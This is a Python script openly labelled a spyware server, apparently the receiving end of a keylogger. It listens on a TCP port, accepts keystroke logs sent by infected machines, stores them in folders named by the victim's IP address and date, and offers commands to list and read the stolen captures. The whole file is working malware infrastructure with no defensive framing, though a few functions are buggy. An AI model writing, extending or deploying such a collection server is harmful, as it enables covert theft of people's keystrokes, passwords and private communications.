#!/usr/bin/env python3

#---------------------------- IMPORT ----------------------------

import socket,argparse,os
from datetime import datetime

#---------------------------- VARIABLES -------------------------
server_ip= '0.0.0.0'
save= "files_keyboard"

#---------------------------- FUNCTIONS -------------------------

def mkdir(dir):
    if not os.path.exists(dir):
        os.makedirs(dir)

def connect(client_socket, client_address):
    try:
        print(f">> {client_address} is connected <<")
        while True:
            data_keylogger = client_socket.recv(32768) #buffer 32Ko

            date= datetime.now().strftime("%Y_%m_%d")
            time= datetime.now().strftime("%H:%M:%S")
            file_name = f"{time}-keyboard.txt"
            folder_name = f"{client_address[0]}-{date}"

            directory = os.path.join(save, folder_name)
            mkdir(directory)
            with open(os.path.join(directory, file_name), 'w') as file:
                file.write(data_keylogger.decode('utf-8'))

            print(f">> New message in {directory}/{file_name} <<")
    except:
        print("Error: cannot connect to the client")
    finally:
        client_socket.close()

def start(port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_ip,port))
    server_socket.listen(1)

    print("\n>> Server is running <<\n")

    try:
        while True:
            client_socket, client_address = server_socket.accept()
            connect(client_socket, client_address)
    except:
        print("Error: cannot connect to the client...")

def read_only(file_read):
    filepath = os.path.join(save, file_read)
    with open(filepath, 'r') as f:
        data = f.read()
        print(f">> {f}: {data} <<")

def show_files():
    for root,files in os.walk(save):
        for file in files:
            print(os.path.join(root, file))

def kill():
    pass

#---------------------------- MAIN -------------------------------
def main():
    print("""
  _____  _____  __     ____          __           _____   ______
 / ____||  __ \ \ \   / /\ \        / /    /\    |  __ \ |  ____|
| (___  | |__) | \ \_/ /  \ \  /\  / /    /  \   | |__) || |__
 \___ \ |  ___/   \   /    \ \/  \/ /    / /\ \  |  _  / |  __|
 ____) || |        | |      \  /\  /    / ____ \ | | \ \ | |____
|_____/ |_|        |_|       \/  \/    /_/    \_\|_|  \_\|______|
 by Serpico\n""")

    setting_dash= argparse.ArgumentParser(description=">> Spyware server <<")
    setting_dash.add_argument("-l", "--listen", metavar="<port>", type=int, help="Listen to files arriving on the port you have selected")
    setting_dash.add_argument("-k", "--kill", help="Kill the server (and the spyware)")
    setting_dash.add_argument("-r", "--readfile", metavar="<folder/file.txt>", help="Show the text of the last file received on the server")
    setting_dash.add_argument("-s", "--show", help="Show the list of files received on the server")
    setting= setting_dash.parse_args()

    if setting.listen:
        start(setting.listen)
    # elif setting.kill:
    #     kill()
    elif setting.readfile:
        read_only(setting.readfile)
    elif setting.show:
        show_files()


if __name__ == "__main__":
    main()

